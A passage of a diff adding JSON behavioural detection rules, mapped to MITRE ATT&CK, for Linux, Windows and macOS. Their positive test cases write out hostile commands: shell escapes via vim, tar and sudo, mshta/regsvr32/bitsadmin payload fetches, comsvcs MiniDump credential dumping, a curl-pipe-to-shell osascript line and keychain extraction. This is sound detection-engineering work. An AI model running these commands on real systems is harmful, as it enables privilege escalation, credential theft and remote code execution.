+   "tactic": "Privilege Escalation",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(vim|vi|view|nvim|ex|less|more|man)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-c\\s*['\\\"]?:?!?\\s*/?\\S*(sh|bash)\\b|:py(thon)?3?\\s+import\\s+os|os\\.execl)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim -c :!/bin/sh"
+     },
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim -c :py3 import os; os.execl('/bin/sh','sh')"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim -c :wq notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-python-pty-spawn",
+   "name": "python pty.spawn shell upgrade",
+   "description": "python -c with pty.spawn to a shell is used to stabilise a reverse shell or break out of restricted tools.",
+   "tactic": "Execution",
+   "technique": "T1059.006",
+   "technique_name": "Python",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "python[\\d.]*$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "pty\\.spawn\\s*\\("
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c import pty; pty.spawn('/bin/bash')"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c import json"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-tar-checkpoint-exec",
+   "name": "tar checkpoint-action exec",
+   "description": "tar with --checkpoint-action=exec runs arbitrary commands, abused via wildcard injection or sudo.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Sudo and Sudo Caching",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/tar$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--checkpoint-action=exec|--to-command|--use-compress-program=\\S*(sh|bash)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf out.tgz --checkpoint=100 src"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-sudo-interpreter-shell",
+   "name": "sudo launching an interpreter shell escape",
+   "description": "sudo running python, perl, ruby, lua or nmap with a shell escape is sudoers-abuse escalation.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Sudo and Sudo Caching",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/sudo$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "sudo\\s+(-\\S+\\s+)*(python[\\d.]*|perl|ruby|lua|php|node|irb|awk|gdb|nmap)\\b.*(os\\.system|exec|system|--interactive|!sh|execl|spawn)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sudo",
+      "command": "sudo python3 -c import os; os.system('/bin/sh')"
+     },
+     {
+      "executable": "/usr/bin/sudo",
+      "command": "sudo nmap --interactive"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sudo",
+      "command": "sudo python3 manage.py migrate"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-env-shell-privileged",
+   "name": "env, nice or timeout exec shell keeping privileges",
+   "description": "env, nice, timeout or stdbuf spawning /bin/sh -p keeps the effective uid and is a SUID abuse pattern.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.001",
+   "technique_name": "Setuid and Setgid",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(env|nice|timeout|stdbuf|setarch|taskset|ionice)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s/bin/(ba)?sh\\s+-p\\b"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins",
+    "suid"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env /bin/sh -p"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env FOO=1 ./app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-git-config-command-exec",
+   "name": "git configured to run a shell command",
+   "description": "git -c core.sshCommand or core.pager set to a shell or network tool executes code via git.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/git$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(core\\.pager=\\S*(sh|bash)|core\\.sshcommand=\\S*(sh|bash|curl|nc)|core\\.fsmonitor=\\S*(sh|bash|curl))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/git",
+      "command": "git -c core.sshCommand=sh -c id fetch"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/git",
+      "command": "git -c core.pager=less log"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-mshta-remote-script",
+   "name": "mshta with URL or inline script",
+   "description": "mshta running a remote HTA or inline vbscript or javascript executes code through a signed binary.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "mshta\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(https?://|vbscript:|javascript:)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")\")"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta http://h/a.hta"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta C:\\apps\\help.hta"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-regsvr32-scrobj-remote",
+   "name": "regsvr32 scrobj with remote sct",
+   "description": "regsvr32 /i with a URL and scrobj.dll loads remote script (Squiblydoo).",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.010",
+   "technique_name": "Regsvr32",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "regsvr32\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(scrobj|/i:https?://)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32 /s /n /u /i:http://h/a.sct scrobj.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32 /s mycom.dll"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-rundll32-script-or-dump",
+   "name": "rundll32 with javascript, MiniDump or UNC dll",
+   "description": "rundll32 invoking javascript:, mshtml RunHTMLApplication, comsvcs MiniDump or a UNC DLL is proxy execution or credential dumping.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.011",
+   "technique_name": "Rundll32",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "rundll32\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(javascript:|runhtmlapplication|comsvcs\\.dll.*minidump|\\\\\\\\\\S+\\\\\\S+\\.dll)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\a.dmp full"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32 shell32.dll,Control_RunDLL"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-wmic-remote-process-create",
+   "name": "wmic process call create with remote node",
+   "description": "wmic /node targeting another host with process call create is remote execution via WMI.",
+   "tactic": "Lateral Movement",
+   "technique": "T1047",
+   "technique_name": "Windows Management Instrumentation",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "wmic\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/node:\\S+.*process\\s+call\\s+create"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin",
+    "lateral"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "command": "wmic /node:10.0.0.5 process call create cmd.exe /c calc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "command": "wmic process list brief"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-bitsadmin-transfer",
+   "name": "bitsadmin transfer or notify command",
+   "description": "bitsadmin /transfer from a URL or SetNotifyCmdLine is used to pull and launch payloads.",
+   "tactic": "Defense Evasion",
+   "technique": "T1197",
+   "technique_name": "BITS Jobs",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "bitsadmin\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/transfer\\s.*https?://|setnotifycmdline)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+      "command": "bitsadmin /transfer j /download /priority high http://h/a.exe C:\\a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+      "command": "bitsadmin /list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-msbuild-user-path-project",
+   "name": "MSBuild building project from user-writable path",
+   "description": "MSBuild executing a project or xml from temp, Public or a URL compiles and runs attacker inline tasks.",
+   "tactic": "Defense Evasion",
+   "technique": "T1127.001",
+   "technique_name": "MSBuild",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "msbuild\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\\\temp\\\\|\\\\users\\\\public\\\\|appdata|https?://)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "command": "MSBuild.exe C:\\Users\\Public\\a.xml"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\MSBuild\\MSBuild.exe",
+      "command": "MSBuild.exe C:\\src\\app.csproj"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-certutil-decode",
+   "name": "certutil decode of staged file",
+   "description": "certutil -decode or -decodehex used to rebuild binaries from text is a file-smuggling technique.",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "technique_name": "Deobfuscate/Decode Files or Information",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "certutil\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-decode(hex)?\\s"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command": "certutil -decode a.b64 a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command": "certutil -store my"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-forfiles-pcalua-indirect",
+   "name": "Indirect command execution via forfiles or pcalua",
+   "description": "forfiles /c or pcalua -a spawn commands through trusted binaries to dodge parent-child rules.",
+   "tactic": "Defense Evasion",
+   "technique": "T1202",
+   "technique_name": "Indirect Command Execution",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(forfiles|pcalua)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/c\\s+\\S*(cmd|powershell|mshta)|-a\\s+\\S*\\.(exe|dll))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\forfiles.exe",
+      "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c cmd /c calc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\forfiles.exe",
+      "command": "forfiles /p C:\\logs /d -30"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-lolbin-installutil-user-dir",
+   "name": "InstallUtil or RegAsm on user-path assembly",
+   "description": "InstallUtil, RegAsm or RegSvcs run on a DLL from a temp or user dir is application-control bypass.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.004",
+   "technique_name": "InstallUtil",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(installutil|regasm|regsvcs)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\\\temp\\\\|\\\\users\\\\public|appdata|downloads)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+      "command": "InstallUtil /U C:\\Users\\Public\\a.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+      "command": "InstallUtil svc.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-macos-osascript-shell-download",
+   "name": "osascript do shell script with download",
+   "description": "osascript invoking do shell script with curl or bash is AppleScript staging used by macOS stealers.",
+   "tactic": "Execution",
+   "technique": "T1059.002",
+   "technique_name": "AppleScript",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/osascript$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "do shell script.*(curl|wget|bash|base64|sh -c)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e do shell script \"curl -s http://h/a | sh\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e tell application \"Finder\" to activate"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-macos-quarantine-strip-user-file",
+   "name": "Quarantine attribute stripped from temp or Downloads file",
+   "description": "Stripping com.apple.quarantine from a file under /tmp or Downloads prepares it to bypass Gatekeeper.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Gatekeeper Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/xattr$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-[a-z]*d\\s+com\\.apple\\.quarantine|-cr?\\s).*(/tmp/|/private/tmp/|downloads/|/var/folders/)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -d com.apple.quarantine /Users/ann/Downloads/app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -l /Users/ann/Documents/a.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-macos-spctl-master-disable",
+   "name": "Gatekeeper assessment disabled",
+   "description": "spctl --master-disable turns off Gatekeeper system wide.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Gatekeeper Bypass",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/spctl$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--(master-)?disable"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --master-disable"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --assess -v /Applications/Safari.app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-macos-security-keychain-extract",
+   "name": "security CLI extracting keychain secrets",
+   "description": "security dump-keychain or find-generic-password -w extracts stored secrets from the login keychain.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/security$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(dump-keychain|find-(generic|internet)-password.*\\s-\\w*[wg])"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -wa Chrome"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security dump-keychain -d login.keychain"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security list-keychains"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-macos-tcc-db-sqlite-write",
+   "name": "TCC database edited via sqlite",
+   "description": "Writing to TCC.db with sqlite3 grants privacy permissions silently.",
+   "tactic": "Defense Evasion",
+   "technique": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/sqlite3$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "tcc\\.db.*(insert|update|replace)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 TCC.db insert into access values('kTCCServiceAccessibility')"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 app.db select 1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-linux-gdb-attach-inject",
+   "name": "Debugger attach to another process with call",
+   "description": "gdb -p combined with call or dlopen injects code into a live process.",
+   "tactic": "Defense Evasion",
+   "technique": "T1055.008",
+   "technique_name": "Ptrace System Calls",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/gdb$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-p\\s+\\d+.*(call|dlopen|shellcode)|--pid=\\d+.*(call|dlopen)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "injection"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb -p 1234 -batch -ex call (void)dlopen(\"/tmp/a.so\",2)"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb ./app core"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-cron-dir-write",
+   "name": "Cron directory write",
+   "description": "A file created or changed under cron spool and cron.d directories installs scheduled execution.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Cron",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(etc/cron\\.(d|daily|hourly|weekly|monthly)/|var/spool/cron(/crontabs)?/)[^/]+$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/cron.d/update",
+      "operation": "create"
+     },
+     {
+      "path": "/var/spool/cron/crontabs/root",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/cron.d/update",
+      "operation": "delete"
+     },
+     {
+      "path": "/etc/crontab.bak/x",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-systemd-unit-created",
+   "name": "systemd unit file created",
+   "description": "A new unit file under /etc/systemd or user unit dirs establishes service persistence.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "technique_name": "Systemd Service",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/etc/systemd/system|/usr/lib/systemd/system|/lib/systemd/system|/home/[^/]+/\\.config/systemd/user|/root/\\.config/systemd/user)/[^/]+\\.(service|timer|socket)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/systemd/system/update-helper.service",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/systemd/system/update-helper.service",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-rc-local-or-profile-write",
+   "name": "Shell startup or rc.local modified",
+   "description": "Writes to rc.local, /etc/profile.d or shell rc files give login-time execution.",
+   "tactic": "Persistence",
+   "technique": "T1037.004",
+   "technique_name": "RC Scripts",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/etc/rc\\.local|/etc/profile\\.d/[^/]+\\.sh|/etc/init\\.d/[^/]+|/home/[^/]+/\\.(bashrc|bash_profile|zshrc|profile)|/root/\\.(bashrc|profile|zshrc))$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/rc.local",
+      "operation": "modify"
+     },
+     {
+      "path": "/etc/profile.d/x.sh",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/rc.local",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-ld-so-preload-write",
+   "name": "ld.so.preload written",
+   "description": "Writing /etc/ld.so.preload injects a library into every dynamically linked process, a userland rootkit hallmark.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Dynamic Linker Hijacking",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/etc/ld\\.so\\.(preload|conf\\.d/[^/]+)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "rootkit"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/ld.so.preload",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/ld.so.cache",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-sudoers-write",
+   "name": "sudoers file created or modified",
+   "description": "Changes under /etc/sudoers.d grant privilege without touching users or groups.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Sudo and Sudo Caching",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/etc/(sudoers|sudoers\\.d/[^/]+)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "privesc"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/sudoers.d/backdoor",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/sudoers.d/backdoor",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-pam-or-sshd-config-write",
+   "name": "PAM or sshd configuration modified",
+   "description": "Edits to /etc/pam.d or sshd_config can add backdoor authentication or permit root login.",
+   "tactic": "Persistence",
+   "technique": "T1556.003",
+   "technique_name": "Pluggable Authentication Modules",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/etc/(pam\\.d/[^/]+|ssh/sshd_config(\\.d/[^/]+)?|security/[^/]+\\.conf)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "auth"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/pam.d/sshd",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/pam.d/sshd",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-pam-module-dropped",
+   "name": "PAM shared object dropped",
+   "description": "A .so created in the PAM module directory can intercept credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1556.003",
+   "technique_name": "Pluggable Authentication Modules",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/security/pam_[^/]+\\.so$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "auth"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/lib/x86_64-linux-gnu/security/pam_unix2.so",
+      "operation": "create"
+     }
